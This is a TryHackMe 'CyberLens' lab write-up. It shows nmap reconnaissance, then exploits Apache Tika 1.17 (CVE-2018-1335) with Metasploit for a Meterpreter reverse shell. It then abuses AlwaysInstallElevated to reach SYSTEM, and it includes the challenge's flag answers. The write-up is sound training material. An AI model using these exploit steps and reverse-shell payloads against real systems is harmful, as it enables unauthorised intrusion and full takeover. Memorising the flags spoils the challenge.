| Category          | Details                                                            |
|-------------------|--------------------------------------------------------------------|
| 📝 **Name**       | [CyberLens](https://tryhackme.com/room/cyberlensp6)                |  
| 🏷 **Type**       | THM Challenge                                                      |
| 🖥 **OS**         | Windows                                                            |
| 🎯 **Difficulty** | Easy                                                               |
| 📁 **Tags**       | Apache Tika 1.17, CVE-2018-1335, Metasploit, AlwaysInstallElevated |

## Task 1: CyberLens 

### What is the user flag? 

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/THM CyberLens]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-13 20:54 +0100
Nmap scan report for 10.82.138.84
Host is up (0.043s latency).
Not shown: 65518 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.57 ((Win64))
|_http-server-header: Apache/2.4.57 (Win64)
|_http-title: CyberLens: Unveiling the Hidden Matrix
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-01-13T19:56:25+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: CYBERLENS
|   NetBIOS_Domain_Name: CYBERLENS
|   NetBIOS_Computer_Name: CYBERLENS
|   DNS_Domain_Name: CyberLens
|   DNS_Computer_Name: CyberLens
|   Product_Version: 10.0.17763
|_  System_Time: 2026-01-13T19:56:18+00:00
| ssl-cert: Subject: commonName=CyberLens
| Not valid before: 2026-01-12T19:50:42
|_Not valid after:  2026-07-14T19:50:42
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
61777/tcp open  http          Jetty 8.y.z-SNAPSHOT
|_http-title: Site doesn't have a title (text/plain).
|_http-server-header: Jetty(8.y.z-SNAPSHOT)
| http-methods: 
|_  Potentially risky methods: PUT
|_http-cors: HEAD GET
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-01-13T19:56:21
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 135.42 seconds
```

#### Enumerate web server running at port 617777
```
┌──(magicrc㉿perun)-[~/attack/THM CyberLens]
└─$ curl http://$TARGET:61777
Apache Tika 1.17
For endpoints, please see https://wiki.apache.org/tika/TikaJAXRS
<SNIP>
```
It seems that Apache Tika 1.17 is running on target. This version has to command injection [CVE-2018-1335](https://nvd.nist.gov/vuln/detail/CVE-2018-1335) vulnerability. 

#### Gain initial foothold by exploiting [CVE-2018-1335](https://nvd.nist.gov/vuln/detail/CVE-2018-1335) with Metasploit
```
┌──(magicrc㉿perun)-[~/attack/THM CyberLens]
└─$ msfconsole -q
msf > search CVE-2018-1335

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/windows/http/apache_tika_jp2_jscript  2018-04-25       excellent  Yes    Apache Tika Header Command Injection


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/apache_tika_jp2_jscript

msf > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/http/apache_tika_jp2_jscript) > show options 

Module options (exploit/windows/http/apache_tika_jp2_jscript):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      9998             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The base path to the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.94     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows



View the full module info with the info, or info -d command.

msf exploit(windows/http/apache_tika_jp2_jscript) > set RHOSTS 10.82.138.84
RHOSTS => 10.82.138.84
msf exploit(windows/http/apache_tika_jp2_jscript) > set RPORT 61777
RPORT => 61777
msf exploit(windows/http/apache_tika_jp2_jscript) > set LHOST tun0
LHOST => 192.168.131.53
msf exploit(windows/http/apache_tika_jp2_jscript) > set PAYLOAD payload/windows/x64/meterpreter_reverse_tcp
PAYLOAD => windows/x64/meterpreter_reverse_tcp
msf exploit(windows/http/apache_tika_jp2_jscript) > run
[*] Started reverse TCP handler on 192.168.131.53:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending PUT request to 10.82.138.84:61777/meta
[*] Command Stager progress -   2.51% done (7999/318455 bytes)
<SNIP>
[*] Sending PUT request to 10.82.138.84:61777/meta
[*] Command Stager progress - 100.00% done (318455/318455 bytes)
[*] Meterpreter session 1 opened (192.168.131.53:4444 -> 10.82.138.84:49761) at 2026-01-14 06:46:10 +0100

meterpreter > getuid
Server username: CYBERLENS\CyberLens
```

#### Capture user flag
```
meterpreter > cat C:\\Users\\CyberLens\\Desktop\\user.txt 
THM{T1k4-CV3-f0r-7h3-w1n}
```

### What is the admin flag?

#### Escalate to `Administrator` by abusing `AlwaysInstallElevated` privilege
Exploit suggested by `post/multi/recon/local_exploit_suggester`. 
```
meterpreter > background 
[*] Backgrounding session 1...
msf exploit(windows/http/apache_tika_jp2_jscript) > use windows/local/always_install_elevated
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/local/always_install_elevated) > set SESSION 1 
SESSION => 1
msf exploit(windows/local/always_install_elevated) > set LHOST tun0
LHOST => tun0
msf exploit(windows/local/always_install_elevated) > set LPORT 5555
LPORT => 5555
msf exploit(windows/local/always_install_elevated) > run
[*] Started reverse TCP handler on 192.168.131.53:5555 
[*] Uploading the MSI to C:\Users\CYBERL~1\AppData\Local\Temp\1\JNTuxTm.msi ...
[*] Executing MSI...
[*] Sending stage (188998 bytes) to 10.82.138.84
[+] Deleted C:\Users\CYBERL~1\AppData\Local\Temp\1\JNTuxTm.msi
[*] Meterpreter session 2 opened (192.168.131.53:5555 -> 10.82.138.84:49774) at 2026-01-14 06:50:24 +0100

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

#### Capture admin flag
```
meterpreter > cat C:\\Users\\Administrator\\Desktop\\admin.txt 
THM{3lev@t3D-4-pr1v35c!}
```
